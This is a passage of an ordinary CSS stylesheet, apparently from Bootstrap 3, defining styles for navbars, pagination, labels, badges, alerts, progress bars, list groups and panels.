  .navbar-inverse .navbar-nav > .active > a,
  .navbar-inverse .navbar-nav > .active > a:hover,
  .navbar-inverse .navbar-nav > .active > a:focus {
    color: #fff;
    background-color: #080808;
  }
  .navbar-inverse .navbar-nav > .disabled > a,
  .navbar-inverse .navbar-nav > .disabled > a:hover,
  .navbar-inverse .navbar-nav > .disabled > a:focus {
    color: #444;
    background-color: transparent;
  }
  .navbar-inverse .navbar-toggle {
    border-color: #333;
  }
  .navbar-inverse .navbar-toggle:hover,
  .navbar-inverse .navbar-toggle:focus {
    background-color: #333;
  }
  .navbar-inverse .navbar-toggle .icon-bar {
    background-color: #fff;
  }
  .navbar-inverse .navbar-collapse,
  .navbar-inverse .navbar-form {
    border-color: #101010;
  }
  .navbar-inverse .navbar-nav > .open > a,
  .navbar-inverse .navbar-nav > .open > a:hover,
  .navbar-inverse .navbar-nav > .open > a:focus {
    color: #fff;
    background-color: #080808;
  }
  @media (max-width: 767px) {
    .navbar-inverse .navbar-nav .open .dropdown-menu > .dropdown-header {
      border-color: #080808;
    }
    .navbar-inverse .navbar-nav .open .dropdown-menu .divider {
      background-color: #080808;
    }
    .navbar-inverse .navbar-nav .open .dropdown-menu > li > a {
      color: #777;
    }
    .navbar-inverse .navbar-nav .open .dropdown-menu > li > a:hover,
    .navbar-inverse .navbar-nav .open .dropdown-menu > li > a:focus {
      color: #fff;
      background-color: transparent;
    }
    .navbar-inverse .navbar-nav .open .dropdown-menu > .active > a,
    .navbar-inverse .navbar-nav .open .dropdown-menu > .active > a:hover,
    .navbar-inverse .navbar-nav .open .dropdown-menu > .active > a:focus {
      color: #fff;
      background-color: #080808;
    }
    .navbar-inverse .navbar-nav .open .dropdown-menu > .disabled > a,
    .navbar-inverse .navbar-nav .open .dropdown-menu > .disabled > a:hover,
    .navbar-inverse .navbar-nav .open .dropdown-menu > .disabled > a:focus {
      color: #444;
      background-color: transparent;
    }
  }
  .navbar-inverse .navbar-link {
    color: #777;
  }
  .navbar-inverse .navbar-link:hover {
    color: #fff;
  }
  .navbar-inverse .btn-link {
    color: #777;
  }
  .navbar-inverse .btn-link:hover,
  .navbar-inverse .btn-link:focus {
    color: #fff;
  }
  .navbar-inverse .btn-link[disabled]:hover,
  fieldset[disabled] .navbar-inverse .btn-link:hover,
  .navbar-inverse .btn-link[disabled]:focus,
  fieldset[disabled] .navbar-inverse .btn-link:focus {
    color: #444;
  }
  .breadcrumb {
    padding: 8px 15px;
    margin-bottom: 20px;
    list-style: none;
    background-color: #f5f5f5;
    border-radius: 4px;
  }
  .breadcrumb > li {
    display: inline-block;
  }
  .breadcrumb > li + li:before {
    padding: 0 5px;
    color: #ccc;
    content: "/\00a0";
  }
  .breadcrumb > .active {
    color: #777;
  }
  .pagination {
    display: inline-block;
    padding-left: 0;
    margin: 20px 0;
    border-radius: 4px;
  }
  .pagination > li {
    display: inline;
  }
  .pagination > li > a,
  .pagination > li > span {
    position: relative;
    float: left;
    padding: 6px 12px;
    margin-left: -1px;
    line-height: 1.42857143;
    color: #428bca;
    text-decoration: none;
    background-color: #fff;
    border: 1px solid #ddd;
  }
  .pagination > li:first-child > a,
  .pagination > li:first-child > span {
    margin-left: 0;
    border-top-left-radius: 4px;
    border-bottom-left-radius: 4px;
  }
  .pagination > li:last-child > a,
  .pagination > li:last-child > span {
    border-top-right-radius: 4px;
    border-bottom-right-radius: 4px;
  }
  .pagination > li > a:hover,
  .pagination > li > span:hover,
  .pagination > li > a:focus,
  .pagination > li > span:focus {
    color: #2a6496;
    background-color: #eee;
    border-color: #ddd;
  }
  .pagination > .active > a,
  .pagination > .active > span,
  .pagination > .active > a:hover,
  .pagination > .active > span:hover,
  .pagination > .active > a:focus,
  .pagination > .active > span:focus {
    z-index: 2;
    color: #fff;
    cursor: default;
    background-color: #428bca;
    border-color: #428bca;
  }
  .pagination > .disabled > span,
  .pagination > .disabled > span:hover,
  .pagination > .disabled > span:focus,
  .pagination > .disabled > a,
  .pagination > .disabled > a:hover,
  .pagination > .disabled > a:focus {
    color: #777;
    cursor: not-allowed;
    background-color: #fff;
    border-color: #ddd;
  }
  .pagination-lg > li > a,
  .pagination-lg > li > span {
    padding: 10px 16px;
    font-size: 18px;
  }
  .pagination-lg > li:first-child > a,
  .pagination-lg > li:first-child > span {
    border-top-left-radius: 6px;
    border-bottom-left-radius: 6px;
  }
  .pagination-lg > li:last-child > a,
  .pagination-lg > li:last-child > span {
    border-top-right-radius: 6px;
    border-bottom-right-radius: 6px;
  }
  .pagination-sm > li > a,
  .pagination-sm > li > span {
    padding: 5px 10px;
    font-size: 12px;
  }
  .pagination-sm > li:first-child > a,
  .pagination-sm > li:first-child > span {
    border-top-left-radius: 3px;
    border-bottom-left-radius: 3px;
  }
  .pagination-sm > li:last-child > a,
  .pagination-sm > li:last-child > span {
    border-top-right-radius: 3px;
    border-bottom-right-radius: 3px;
  }
  .pager {
    padding-left: 0;
    margin: 20px 0;
    text-align: center;
    list-style: none;
  }
  .pager li {
    display: inline;
  }
  .pager li > a,
  .pager li > span {
    display: inline-block;
    padding: 5px 14px;
    background-color: #fff;
    border: 1px solid #ddd;
    border-radius: 15px;
  }
  .pager li > a:hover,
  .pager li > a:focus {
    text-decoration: none;
    background-color: #eee;
  }
  .pager .next > a,
  .pager .next > span {
    float: right;
  }
  .pager .previous > a,
  .pager .previous > span {
    float: left;
  }
  .pager .disabled > a,
  .pager .disabled > a:hover,
  .pager .disabled > a:focus,
  .pager .disabled > span {
    color: #777;
    cursor: not-allowed;
    background-color: #fff;
  }
  .label {
    display: inline;
    padding: .2em .6em .3em;
    font-size: 75%;
    font-weight: bold;
    line-height: 1;
    color: #fff;
    text-align: center;
    white-space: nowrap;
    vertical-align: baseline;
    border-radius: .25em;
  }
  a.label:hover,
  a.label:focus {
    color: #fff;
    text-decoration: none;
    cursor: pointer;
  }
  .label:empty {
    display: none;
  }
  .btn .label {
    position: relative;
    top: -1px;
  }
  .label-default {
    background-color: #777;
  }
  .label-default[href]:hover,
  .label-default[href]:focus {
    background-color: #5e5e5e;
  }
  .label-primary {
    background-color: #428bca;
  }
  .label-primary[href]:hover,
  .label-primary[href]:focus {
    background-color: #3071a9;
  }
  .label-success {
    background-color: #5cb85c;
  }
  .label-success[href]:hover,
  .label-success[href]:focus {
    background-color: #449d44;
  }
  .label-info {
    background-color: #5bc0de;
  }
  .label-info[href]:hover,
  .label-info[href]:focus {
    background-color: #31b0d5;
  }
  .label-warning {
    background-color: #f0ad4e;
  }
  .label-warning[href]:hover,
  .label-warning[href]:focus {
    background-color: #ec971f;
  }
  .label-danger {
    background-color: #d9534f;
  }
  .label-danger[href]:hover,
  .label-danger[href]:focus {
    background-color: #c9302c;
  }
  .badge {
    display: inline-block;
    min-width: 10px;
    padding: 3px 7px;
    font-size: 12px;
    font-weight: bold;
    line-height: 1;
    color: #fff;
    text-align: center;
    white-space: nowrap;
    vertical-align: baseline;
    background-color: #777;
    border-radius: 10px;
  }
  .badge:empty {
    display: none;
  }
  .btn .badge {
    position: relative;
    top: -1px;
  }
  .btn-xs .badge {
    top: 0;
    padding: 1px 5px;
  }
  a.badge:hover,
  a.badge:focus {
    color: #fff;
    text-decoration: none;
    cursor: pointer;
  }
  a.list-group-item.active > .badge,
  .nav-pills > .active > a > .badge {
    color: #428bca;
    background-color: #fff;
  }
  .nav-pills > li > a > .badge {
    margin-left: 3px;
  }
  .jumbotron {
    padding: 30px;
    margin-bottom: 30px;
    color: inherit;
    background-color: #eee;
  }
  .jumbotron h1,
  .jumbotron .h1 {
    color: inherit;
  }
  .jumbotron p {
    margin-bottom: 15px;
    font-size: 21px;
    font-weight: 200;
  }
  .jumbotron > hr {
    border-top-color: #d5d5d5;
  }
  .container .jumbotron {
    border-radius: 6px;
  }
  .jumbotron .container {
    max-width: 100%;
  }
  @media screen and (min-width: 768px) {
    .jumbotron {
      padding-top: 48px;
      padding-bottom: 48px;
    }
    .container .jumbotron {
      padding-right: 60px;
      padding-left: 60px;
    }
    .jumbotron h1,
    .jumbotron .h1 {
      font-size: 63px;
    }
  }
  .thumbnail {
    display: block;
    padding: 4px;
    margin-bottom: 20px;
    line-height: 1.42857143;
    background-color: #fff;
    border: 1px solid #ddd;
    border-radius: 4px;
    -webkit-transition: all .2s ease-in-out;
         -o-transition: all .2s ease-in-out;
            transition: all .2s ease-in-out;
  }
  .thumbnail > img,
  .thumbnail a > img {
    margin-right: auto;
    margin-left: auto;
  }
  a.thumbnail:hover,
  a.thumbnail:focus,
  a.thumbnail.active {
    border-color: #428bca;
  }
  .thumbnail .caption {
    padding: 9px;
    color: #333;
  }
  .alert {
    padding: 15px;
    margin-bottom: 20px;
    border: 1px solid transparent;
    border-radius: 4px;
  }
  .alert h4 {
    margin-top: 0;
    color: inherit;
  }
  .alert .alert-link {
    font-weight: bold;
  }
  .alert > p,
  .alert > ul {
    margin-bottom: 0;
  }
  .alert > p + p {
    margin-top: 5px;
  }
  .alert-dismissable,
  .alert-dismissible {
    padding-right: 35px;
  }
  .alert-dismissable .close,
  .alert-dismissible .close {
    position: relative;
    top: -2px;
    right: -21px;
    color: inherit;
  }
  .alert-success {
    color: #3c763d;
    background-color: #dff0d8;
    border-color: #d6e9c6;
  }
  .alert-success hr {
    border-top-color: #c9e2b3;
  }
  .alert-success .alert-link {
    color: #2b542c;
  }
  .alert-info {
    color: #31708f;
    background-color: #d9edf7;
    border-color: #bce8f1;
  }
  .alert-info hr {
    border-top-color: #a6e1ec;
  }
  .alert-info .alert-link {
    color: #245269;
  }
  .alert-warning {
    color: #8a6d3b;
    background-color: #fcf8e3;
    border-color: #faebcc;
  }
  .alert-warning hr {
    border-top-color: #f7e1b5;
  }
  .alert-warning .alert-link {
    color: #66512c;
  }
  .alert-danger {
    color: #a94442;
    background-color: #f2dede;
    border-color: #ebccd1;
  }
  .alert-danger hr {
    border-top-color: #e4b9c0;
  }
  .alert-danger .alert-link {
    color: #843534;
  }
  @-webkit-keyframes progress-bar-stripes {
    from {
      background-position: 40px 0;
    }
    to {
      background-position: 0 0;
    }
  }
  @-o-keyframes progress-bar-stripes {
    from {
      background-position: 40px 0;
    }
    to {
      background-position: 0 0;
    }
  }
  @keyframes progress-bar-stripes {
    from {
      background-position: 40px 0;
    }
    to {
      background-position: 0 0;
    }
  }
  .progress {
    height: 20px;
    margin-bottom: 20px;
    overflow: hidden;
    background-color: #f5f5f5;
    border-radius: 4px;
    -webkit-box-shadow: inset 0 1px 2px rgba(0, 0, 0, .1);
            box-shadow: inset 0 1px 2px rgba(0, 0, 0, .1);
  }
  .progress-bar {
    float: left;
    width: 0;
    height: 100%;
    font-size: 12px;
    line-height: 20px;
    color: #fff;
    text-align: center;
    background-color: #428bca;
    -webkit-box-shadow: inset 0 -1px 0 rgba(0, 0, 0, .15);
            box-shadow: inset 0 -1px 0 rgba(0, 0, 0, .15);
    -webkit-transition: width .6s ease;
         -o-transition: width .6s ease;
            transition: width .6s ease;
  }
  .progress-striped .progress-bar,
  .progress-bar-striped {
    background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
    background-image:      -o-linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
    background-image:         linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
    -webkit-background-size: 40px 40px;
            background-size: 40px 40px;
  }
  .progress.active .progress-bar,
  .progress-bar.active {
    -webkit-animation: progress-bar-stripes 2s linear infinite;
         -o-animation: progress-bar-stripes 2s linear infinite;
            animation: progress-bar-stripes 2s linear infinite;
  }
  .progress-bar[aria-valuenow="1"],
  .progress-bar[aria-valuenow="2"] {
    min-width: 30px;
  }
  .progress-bar[aria-valuenow="0"] {
    min-width: 30px;
    color: #777;
    background-color: transparent;
    background-image: none;
    -webkit-box-shadow: none;
            box-shadow: none;
  }
  .progress-bar-success {
    background-color: #5cb85c;
  }
  .progress-striped .progress-bar-success {
    background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
    background-image:      -o-linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
    background-image:         linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
  }
  .progress-bar-info {
    background-color: #5bc0de;
  }
  .progress-striped .progress-bar-info {
    background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
    background-image:      -o-linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
    background-image:         linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
  }
  .progress-bar-warning {
    background-color: #f0ad4e;
  }
  .progress-striped .progress-bar-warning {
    background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
    background-image:      -o-linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
    background-image:         linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
  }
  .progress-bar-danger {
    background-color: #d9534f;
  }
  .progress-striped .progress-bar-danger {
    background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
    background-image:      -o-linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
    background-image:         linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
  }
  .media,
  .media-body {
    overflow: hidden;
    zoom: 1;
  }
  .media,
  .media .media {
    margin-top: 15px;
  }
  .media:first-child {
    margin-top: 0;
  }
  .media-object {
    display: block;
  }
  .media-heading {
    margin: 0 0 5px;
  }
  .media > .pull-left {
    margin-right: 10px;
  }
  .media > .pull-right {
    margin-left: 10px;
  }
  .media-list {
    padding-left: 0;
    list-style: none;
  }
  .list-group {
    padding-left: 0;
    margin-bottom: 20px;
  }
  .list-group-item {
    position: relative;
    display: block;
    padding: 10px 15px;
    margin-bottom: -1px;
    background-color: #fff;
    border: 1px solid #ddd;
  }
  .list-group-item:first-child {
    border-top-left-radius: 4px;
    border-top-right-radius: 4px;
  }
  .list-group-item:last-child {
    margin-bottom: 0;
    border-bottom-right-radius: 4px;
    border-bottom-left-radius: 4px;
  }
  .list-group-item > .badge {
    float: right;
  }
  .list-group-item > .badge + .badge {
    margin-right: 5px;
  }
  a.list-group-item {
    color: #555;
  }
  a.list-group-item .list-group-item-heading {
    color: #333;
  }
  a.list-group-item:hover,
  a.list-group-item:focus {
    color: #555;
    text-decoration: none;
    background-color: #f5f5f5;
  }
  .list-group-item.disabled,
  .list-group-item.disabled:hover,
  .list-group-item.disabled:focus {
    color: #777;
    background-color: #eee;
  }
  .list-group-item.disabled .list-group-item-heading,
  .list-group-item.disabled:hover .list-group-item-heading,
  .list-group-item.disabled:focus .list-group-item-heading {
    color: inherit;
  }
  .list-group-item.disabled .list-group-item-text,
  .list-group-item.disabled:hover .list-group-item-text,
  .list-group-item.disabled:focus .list-group-item-text {
    color: #777;
  }
  .list-group-item.active,
  .list-group-item.active:hover,
  .list-group-item.active:focus {
    z-index: 2;
    color: #fff;
    background-color: #428bca;
    border-color: #428bca;
  }
  .list-group-item.active .list-group-item-heading,
  .list-group-item.active:hover .list-group-item-heading,
  .list-group-item.active:focus .list-group-item-heading,
  .list-group-item.active .list-group-item-heading > small,
  .list-group-item.active:hover .list-group-item-heading > small,
  .list-group-item.active:focus .list-group-item-heading > small,
  .list-group-item.active .list-group-item-heading > .small,
  .list-group-item.active:hover .list-group-item-heading > .small,
  .list-group-item.active:focus .list-group-item-heading > .small {
    color: inherit;
  }
  .list-group-item.active .list-group-item-text,
  .list-group-item.active:hover .list-group-item-text,
  .list-group-item.active:focus .list-group-item-text {
    color: #e1edf7;
  }
  .list-group-item-success {
    color: #3c763d;
    background-color: #dff0d8;
  }
  a.list-group-item-success {
    color: #3c763d;
  }
  a.list-group-item-success .list-group-item-heading {
    color: inherit;
  }
  a.list-group-item-success:hover,
  a.list-group-item-success:focus {
    color: #3c763d;
    background-color: #d0e9c6;
  }
  a.list-group-item-success.active,
  a.list-group-item-success.active:hover,
  a.list-group-item-success.active:focus {
    color: #fff;
    background-color: #3c763d;
    border-color: #3c763d;
  }
  .list-group-item-info {
    color: #31708f;
    background-color: #d9edf7;
  }
  a.list-group-item-info {
    color: #31708f;
  }
  a.list-group-item-info .list-group-item-heading {
    color: inherit;
  }
  a.list-group-item-info:hover,
  a.list-group-item-info:focus {
    color: #31708f;
    background-color: #c4e3f3;
  }
  a.list-group-item-info.active,
  a.list-group-item-info.active:hover,
  a.list-group-item-info.active:focus {
    color: #fff;
    background-color: #31708f;
    border-color: #31708f;
  }
  .list-group-item-warning {
    color: #8a6d3b;
    background-color: #fcf8e3;
  }
  a.list-group-item-warning {
    color: #8a6d3b;
  }
  a.list-group-item-warning .list-group-item-heading {
    color: inherit;
  }
  a.list-group-item-warning:hover,
  a.list-group-item-warning:focus {
    color: #8a6d3b;
    background-color: #faf2cc;
  }
  a.list-group-item-warning.active,
  a.list-group-item-warning.active:hover,
  a.list-group-item-warning.active:focus {
    color: #fff;
    background-color: #8a6d3b;
    border-color: #8a6d3b;
  }
  .list-group-item-danger {
    color: #a94442;
    background-color: #f2dede;
  }
  a.list-group-item-danger {
    color: #a94442;
  }
  a.list-group-item-danger .list-group-item-heading {
    color: inherit;
  }
  a.list-group-item-danger:hover,
  a.list-group-item-danger:focus {
    color: #a94442;
    background-color: #ebcccc;
  }
  a.list-group-item-danger.active,
  a.list-group-item-danger.active:hover,
  a.list-group-item-danger.active:focus {
    color: #fff;
    background-color: #a94442;
    border-color: #a94442;
  }
  .list-group-item-heading {
    margin-top: 0;
    margin-bottom: 5px;
  }
  .list-group-item-text {
    margin-bottom: 0;
    line-height: 1.3;
  }
  .panel {
    margin-bottom: 20px;
    background-color: #fff;
    border: 1px solid transparent;
    border-radius: 4px;
    -webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, .05);
            box-shadow: 0 1px 1px rgba(0, 0, 0, .05);
  }
  .panel-body {
    padding: 15px;
  }
  .panel-heading {
    padding: 10px 15px;
    border-bottom: 1px solid transparent;
    border-top-left-radius: 3px;
    border-top-right-radius: 3px;
  }
  .panel-heading > .dropdown .dropdown-toggle {
    color: inherit;
  }
  .panel-title {
    margin-top: 0;
    margin-bottom: 0;
    font-size: 16px;
    color: inherit;
  }
  .panel-title > a {
    color: inherit;
  }
  .panel-footer {
    padding: 10px 15px;
    background-color: #f5f5f5;
    border-top: 1px solid #ddd;
    border-bottom-right-radius: 3px;
    border-bottom-left-radius: 3px;
  }
  .panel > .list-group {
    margin-bottom: 0;
  }
  .panel > .list-group .list-group-item {
    border-width: 1px 0;
    border-radius: 0;
  }
  .panel > .list-group:first-child .list-group-item:first-child {
    border-top: 0;
    border-top-left-radius: 3px;
    border-top-right-radius: 3px;
  }
  .panel > .list-group:last-child .list-group-item:last-child {
    border-bottom: 0;
    border-bottom-right-radius: 3px;
    border-bottom-left-radius: 3px;
  }
  .panel-heading + .list-group .list-group-item:first-child {
    border-top-width: 0;
  }
  .list-group + .panel-footer {
    border-top-width: 0;
  }
  .panel > .table,
  .panel > .table-responsive > .table,
  .panel > .panel-collapse > .table {
    margin-bottom: 0;
  }
  .panel > .table:first-child,
  .panel > .table-responsive:first-child > .table:first-child {
    border-top-left-radius: 3px;
    border-top-right-radius: 3px;
  }
  .panel > .table:first-child > thead:first-child > tr:first-child td:first-child,
  .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child td:first-child,
  .panel > .table:first-child > tbody:first-child > tr:first-child td:first-child,
  .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child td:first-child,
  .panel > .table:first-child > thead:first-child > tr:first-child th:first-child,
  .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child th:first-child,
  .panel > .table:first-child > tbody:first-child > tr:first-child th:first-child,
  .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child th:first-child {
    border-top-left-radius: 3px;
  }
  .panel > .table:first-child > thead:first-child > tr:first-child td:last-child,
  .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child td:last-child,
  .panel > .table:first-child > tbody:first-child > tr:first-child td:last-child,
  .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child td:last-child,
  .panel > .table:first-child > thead:first-child > tr:first-child th:last-child,
  .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child th:last-child,
  .panel > .table:first-child > tbody:first-child > tr:first-child th:last-child,
  .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child th:last-child {
    border-top-right-radius: 3px;
  }
  .panel > .table:last-child,
  .panel > .table-responsive:last-child > .table:last-child {
    border-bottom-right-radius: 3px;
    border-bottom-left-radius: 3px;
  }
  .panel > .table:last-child > tbody:last-child > tr:last-child td:first-child,
  .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child td:first-child,
  .panel > .table:last-child > tfoot:last-child > tr:last-child td:first-child,
  .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child td:first-child,
  .panel > .table:last-child > tbody:last-child > tr:last-child th:first-child,
  .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child th:first-child,
  .panel > .table:last-child > tfoot:last-child > tr:last-child th:first-child,
  .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child th:first-child {
    border-bottom-left-radius: 3px;
  }
  .panel > .table:last-child > tbody:last-child > tr:last-child td:last-child,
  .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child td:last-child,
  .panel > .table:last-child > tfoot:last-child > tr:last-child td:last-child,
  .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child td:last-child,
  .panel > .table:last-child > tbody:last-child > tr:last-child th:last-child,
  .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child th:last-child,
  .panel > .table:last-child > tfoot:last-child > tr:last-child th:last-child,
  .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child th:last-child {
    border-bottom-right-radius: 3px;
  }
  .panel > .panel-body + .table,
  .panel > .panel-body + .table-responsive {
    border-top: 1px solid #ddd;
  }
  .panel > .table > tbody:first-child > tr:first-child th,
  .panel > .table > tbody:first-child > tr:first-child td {
    border-top: 0;
  }
  .panel > .table-bordered,
  .panel > .table-responsive > .table-bordered {
    border: 0;
  }
  .panel > .table-bordered > thead > tr > th:first-child,
  .panel > .table-responsive > .table-bordered > thead > tr > th:first-child,
  .panel > .table-bordered > tbody > tr > th:first-child,
  .panel > .table-responsive > .table-bordered > tbody > tr > th:first-child,
  .panel > .table-bordered > tfoot > tr > th:first-child,
  .panel > .table-responsive > .table-bordered > tfoot > tr > th:first-child,
  .panel > .table-bordered > thead > tr > td:first-child,
  .panel > .table-responsive > .table-bordered > thead > tr > td:first-child,
  .panel > .table-bordered > tbody > tr > td:first-child,
  .panel > .table-responsive > .table-bordered > tbody > tr > td:first-child,
  .panel > .table-bordered > tfoot > tr > td:first-child,
  .panel > .table-responsive > .table-bordered > tfoot > tr > td:first-child {
    border-left: 0;
  }
  .panel > .table-bordered > thead > tr > th:last-child,
  .panel > .table-responsive > .table-bordered > thead > tr > th:last-child,
  .panel > .table-bordered > tbody > tr > th:last-child,
  .panel > .table-responsive > .table-bordered > tbody > tr > th:last-child,
  .panel > .table-bordered > tfoot > tr > th:last-child,
  .panel > .table-responsive > .table-bordered > tfoot > tr > th:last-child,
  .panel > .table-bordered > thead > tr > td:last-child,
  .panel > .table-responsive > .table-bordered > thead > tr > td:last-child,
  .panel > .table-bordered > tbody > tr > td:last-child,
  .panel > .table-responsive > .table-bordered > tbody > tr > td:last-child,
  .panel > .table-bordered > tfoot > tr > td:last-child,
  .panel > .table-responsive > .table-bordered > tfoot > tr > td:last-child {
    border-right: 0;
  }
  .panel > .table-bordered > thead > tr:first-child > td,
  .panel > .table-responsive > .table-bordered > thead > tr:first-child > td,
  .panel > .table-bordered > tbody > tr:first-child > td,
  .panel > .table-responsive > .table-bordered > tbody > tr:first-child > td,
  .panel > .table-bordered > thead > tr:first-child > th,
  .panel > .table-responsive > .table-bordered > thead > tr:first-child > th,
  .panel > .table-bordered > tbody > tr:first-child > th,
  .panel > .table-responsive > .table-bordered > tbody > tr:first-child > th {
    border-bottom: 0;
  }
  .panel > .table-bordered > tbody > tr:last-child > td,
  .panel > .table-responsive > .table-bordered > tbody > tr:last-child > td,
  .panel > .table-bordered > tfoot > tr:last-child > td,
  .panel > .table-responsive > .table-bordered > tfoot > tr:last-child > td,
  .panel > .table-bordered > tbody > tr:last-child > th,
  .panel > .table-responsive > .table-bordered > tbody > tr:last-child > th,
  .panel > .table-bordered > tfoot > tr:last-child > th,
  .panel > .table-responsive > .table-bordered > tfoot > tr:last-child > th {
    border-bottom: 0;
  }
  .panel > .table-responsive {
    margin-bottom: 0;
    border: 0;
  }
  .panel-group {
    margin-bottom: 20px;
  }
  .panel-group .panel {
    margin-bottom: 0;
    border-radius: 4px;
  }
  .panel-group .panel + .panel {
    margin-top: 5px;
  }
  .panel-group .panel-heading {
    border-bottom: 0;
  }
  .panel-group .panel-heading + .panel-collapse > .panel-body {
    border-top: 1px solid #ddd;
  }
  .panel-group .panel-footer {
    border-top: 0;
  }
  .panel-group .panel-footer + .panel-collapse .panel-body {
    border-bottom: 1px solid #ddd;
  }
  .panel-default {
    border-color: #ddd;
  }
  .panel-default > .panel-heading {
    color: #333;
    background-color: #f5f5f5;
    border-color: #ddd;
  }
  .panel-default > .panel-heading + .panel-collapse > .panel-body {
    border-top-color: #ddd;
  }
  .panel-default > .panel-heading .badge {
    color: #f5f5f5;
    background-color: #333;
  }
  .panel-default > .panel-footer + .panel-collapse > .panel-body {
    border-bottom-color: #ddd;
  }
  .panel-primary {
    border-color: #428bca;
  }
  .panel-primary > .panel-heading {
    color: #fff;
    background-color: #428bca;
    border-color: #428bca;
  }
  .panel-primary > .panel-heading + .panel-collapse > .panel-body {
    border-top-color: #428bca;
  }
  .panel-primary > .panel-heading .badge {
    color: #428bca;
    background-color: #fff;
  }
  .panel-primary > .panel-footer + .panel-collapse > .panel-body {
    border-bottom-color: #428bca;
  }
  .panel-success {
    border-color: #d6e9c6;
  }
  .panel-success > .panel-heading {
    color: #3c763d;
    background-color: #dff0d8;
    border-color: #d6e9c6;
  }
  .panel-success > .panel-heading + .panel-collapse > .panel-body {
    border-top-color: #d6e9c6;
  }
  .panel-success > .panel-heading .badge {
    color: #dff0d8;
    background-color: #3c763d;
  }
  .panel-success > .panel-footer + .panel-collapse > .panel-body {
    border-bottom-color: #d6e9c6;
  }
  .panel-info {
    border-color: #bce8f1;
  }
  .panel-info > .panel-heading {
    color: #31708f;
    background-color: #d9edf7;
    border-color: #bce8f1;
  }
  .panel-info > .panel-heading + .panel-collapse > .panel-body {
    border-top-color: #bce8f1;
  }
  .panel-info > .panel-heading .badge {
    color: #d9edf7;
    background-color: #31708f;
  }
  .panel-info > .panel-footer + .panel-collapse > .panel-body {
    border-bottom-color: #bce8f1;
  }
  .panel-warning {
    border-color: #faebcc;
  }
  .panel-warning > .panel-heading {
    color: #8a6d3b;
    background-color: #fcf8e3;
    border-color: #faebcc;
  }
  .panel-warning > .panel-heading + .panel-collapse > .panel-body {
    border-top-color: #faebcc;
  }
  .panel-warning > .panel-heading .badge {
    color: #fcf8e3;
    background-color: #8a6d3b;
  }
  .panel-warning > .panel-footer + .panel-collapse > .panel-body {
    border-bottom-color: #faebcc;
  }
  .panel-danger {
    border-color: #ebccd1;
  }
  .panel-danger > .panel-heading {
    color: #a94442;
    background-color: #f2dede;
    border-color: #ebccd1;
  }
  .panel-danger > .panel-heading + .panel-collapse > .panel-body {
    border-top-color: #ebccd1;
  }
  .panel-danger > .panel-heading .badge {
    color: #f2dede;
    background-color: #a94442;
  }
  .panel-danger > .panel-footer + .panel-collapse > .panel-body {
    border-bottom-color: #ebccd1;
  }
  .embed-responsive {
    position: relative;
    display: block;
    height: 0;
    padding: 0;
    overflow: hidden;
  }
  .embed-responsive .embed-responsive-item,
